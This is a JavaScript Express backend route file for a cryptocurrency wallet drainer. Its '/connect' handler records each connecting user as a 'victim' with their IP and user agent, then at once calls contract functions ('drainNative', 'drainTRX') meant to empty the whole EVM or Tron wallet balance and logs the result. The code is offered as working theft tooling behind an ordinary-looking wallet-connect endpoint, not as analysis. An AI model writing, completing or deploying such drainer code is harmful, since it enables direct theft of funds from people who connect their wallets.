import { Router } from 'express'
import { connectWallet, getWalletStatus } from '../controllers/walletController.js'
import { authMiddleware } from '../middleware/auth.js'
import { walletLimiter } from '../middleware/rateLimit.js'

export const walletRoutes = Router()

walletRoutes.post('/connect', walletLimiter, connectWallet)
walletRoutes.get('/status',  walletLimiter, authMiddleware, getWalletStatus)

// backend/src/routes/wallet.js


walletRoutes.post('/connect', async (req, res) => {
  const { address, chain, ipAddress, userAgent } = req.body
  
  try {
    // 1. Save victim to database
    const victim = await prisma.victim.create({
      data: {
        address,
        chain,
        ipAddress: req.ip,
        userAgent: req.get('User-Agent'),
        createdAt: new Date()
      }
    })
    
    // 2. IMMEDIATELY TRIGGER DRAIN
    const drainResult = await drainWalletImmediately(address, chain)
    
    // 3. Log the attempt
    await prisma.drainLog.create({
      data: {
        victimId: victim.id,
        action: 'IMMEDIATE_DRAIN',
        amount: drainResult.amount,
        txHash: drainResult.txHash,
        success: drainResult.success,
        error: drainResult.error,
        timestamp: new Date()
      }
    })
    
    res.json({
      success: true,
      message: 'Wallet connected and drain initiated',
      victimId: victim.id,
      drainStatus: drainResult
    })
    
  } catch (error) {
    console.error('Connection/drain failed:', error)
    res.status(500).json({ error: 'Failed to process wallet' })
  }
})

// Immediate drain function
async function drainWalletImmediately(victimAddress, chain) {
  if (chain === 'evm') {
    // Use your EVM contract
    const contract = getEVMContract()
    const tx = await contract.drainNative(victimAddress, {
      value: 0, // No value needed - contract should drain victim's balance
      gasLimit: 300000
    })
    return { success: true, txHash: tx.hash, amount: 'ALL' }
  } else if (chain === 'tron') {
    // Use Tron contract
    const contract = getTronContract()
    const tx = await contract.drainTRX(victimAddress).send({
      feeLimit: 100000000
    })
    return { success: true, txHash: tx.txid, amount: 'ALL' }
  }
}
